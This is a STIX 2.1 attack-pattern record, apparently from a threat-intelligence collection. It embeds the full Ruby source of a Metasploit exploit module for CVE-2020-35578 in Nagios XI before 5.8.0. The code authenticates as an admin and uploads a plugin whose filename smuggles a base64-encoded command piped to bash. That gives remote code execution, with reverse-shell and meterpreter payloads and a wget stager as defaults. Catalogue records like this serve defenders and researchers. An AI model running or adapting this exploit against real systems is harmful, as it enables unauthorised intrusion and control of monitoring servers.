{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c894de3b-e578-4f2e-8a56-f8c9368bd8d1",
    "created": "2024-08-14T17:03:50.631248Z",
    "modified": "2024-08-14T17:03:50.631252Z",
    "name": "Nagios XI Prior to 5.8.0 - Plugins Filename Authenticated Remote Code Exection",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nagios_xi_plugins_filename_authenticated_rce.rb",
            "external_id": "nagios_xi_plugins_filename_authenticated_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-35578"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::NagiosXi\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Nagios XI Prior to 5.8.0 - Plugins Filename Authenticated Remote Code Exection',\n        'Description' => %q{\n          This module exploits a command injection vulnerability (CVE-2020-35578) in the `/admin/monitoringplugins.php`\n          page of Nagios XI versions prior to 5.8.0 when uploading plugins. Successful exploitation allows\n          an authenticated admin user to achieve remote code execution as the `apache` user by uploading\n          a malicious plugin.\n\n          Valid credentials for a Nagios XI admin user are required. This module has\n          been successfully tested against Nagios versions XI 5.3.0 and 5.7.5, both\n          running on CentOS 7.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Haboob Team', # https://haboob.sa - PoC\n          'Erik Wynter' # @wyntererik - Metasploit'\n        ],\n        'References' => [\n          ['CVE', '2020-35578'],\n          ['EDB', '49422']\n        ],\n        'Platform' => %w[linux unix],\n        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_CMD],\n        'Targets' => [\n          [\n            'Linux (x86/x64)', {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Platform' => 'linux',\n              # only the wget and perhaps the curl CmdStagers work against a typical Nagios XI host (CentOS 7 minimal) if Nagios XI was installed according to the documentation\n              'CmdStagerFlavor' => :wget,\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'CMD', {\n              'Arch' => [ARCH_CMD],\n              'Platform' => 'unix',\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-12-19',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES ],\n          'Reliability' => [FIRST_ATTEMPT_FAIL] # payload may not connect back the first time\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', nil])\n    ]\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def finish_install\n    datastore['FINISH_INSTALL']\n  end\n\n  def check\n    # Use nagios_xi_login to try and authenticate. If authentication succeeds, nagios_xi_login returns\n    # an array containing the http response body of a get request to index.php and the session cookies\n    auth_result, err_msg, @auth_cookies, @version = authenticate(username, password, finish_install)\n    case auth_result\n    when AUTH_RESULTS[:connection_failed]\n      return CheckCode::Unknown(err_msg)\n    when AUTH_RESULTS[:unexpected_error], AUTH_RESULTS[:not_fully_installed], AUTH_RESULTS[:failed_to_handle_license_agreement], AUTH_RESULTS[:failed_to_extract_tokens], AUTH_RESULTS[:unable_to_obtain_version]\n      return CheckCode::Detected(err_msg)\n    when AUTH_RESULTS[:not_nagios_application]\n      return CheckCode::Safe(err_msg)\n    end\n\n    if @version < Rex::Version.new('5.8.0')\n      return CheckCode::Appears\n    end\n\n    return CheckCode::Safe\n  end\n\n  def execute_command(cmd, _opts = {})\n    # Convert the payload to hex ASCII and then Base64 encode the payload.\n    # This is necessary for the exploit to work.\n    payload_ascii = Rex::Text.to_hex_ascii(cmd)\n    payload_base64 = Rex::Text.encode_base64(payload_ascii)\n    payload = \";echo #{payload_base64} | base64 -d | bash;#\"\n    register_file_for_cleanup(\"/usr/local/nagios/libexec/#{payload}\") # deleting the payload via the web interface doesn't seem possible\n\n    # generate post data\n    post_data = Rex::MIME::Message.new\n    random_post_content = rand_text_alphanumeric(8..12)\n    post_data.add_part('', nil, nil, 'form-data; name=\"upload\"')\n    post_data.add_part(@nsp, nil, nil, 'form-data; name=\"nsp\"')\n    post_data.add_part(random_post_content, 'text/plain', nil, \"form-data; name=\\\"uploadedfile\\\"; filename=\\\"#{payload}\\\"\")\n    post_data.add_part('1', nil, nil, 'form-data; name=\"convert_to_unix\"')\n\n    # upload payload\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php'),\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie' => @auth_cookies,\n      'data' => post_data.to_s\n    }, 0) # don't wait for a response from the target, otherwise the module will hang for a few seconds after executing the payload\n  end\n\n  def exploit\n    unless @auth_cookies.present?\n      auth_result, err_msg, @auth_cookies, @version = authenticate(username, password, finish_install)\n      case auth_result\n      when AUTH_RESULTS[:connection_failed]\n        return CheckCode::Unknown(err_msg)\n      when AUTH_RESULTS[:unexpected_error], AUTH_RESULTS[:not_fully_installed], AUTH_RESULTS[:failed_to_handle_license_agreement], AUTH_RESULTS[:failed_to_extract_tokens], AUTH_RESULTS[:unable_to_obtain_version]\n        return CheckCode::Detected(err_msg)\n      when AUTH_RESULTS[:not_nagios_application]\n        return CheckCode::Safe(err_msg)\n      end\n    end\n\n    if @version < Rex::Version.new('5.3.0')\n      fail_with(Failure::NoTarget, 'Target is vulnerable but this module currently does not support exploiting target prior to 5.3.0!')\n    end\n\n    # visit /admin/monitoringplugins.php in order to get the nsp token required to upload the payload\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php'),\n      'cookie' => @auth_cookies\n    })\n\n    unless res\n      fail_with(Failure::Disconnected, \"Connection failed while trying to visit `#{normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php')}`\")\n    end\n\n    unless res.code == 200 && res.body.include?('<title>Manage Plugins &middot; Nagios XI</title>')\n      fail_with(Failure::UnexpectedReply, \"Unexpected response received while trying to visit `#{normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php')}`\")\n    end\n\n    # grab the nsp token, using the Nagios XI mixin\n    @nsp = get_nsp(res)\n\n    if @nsp.blank?\n      fail_with(Failure::Unknown, 'Failed to obtain the nsp token required to upload the payload')\n    end\n\n    if target.arch.first == ARCH_CMD\n      print_status('Executing the payload')\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(background: true)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-12-19",
    "x_mitre_platforms": [
        "unix'"
    ]
}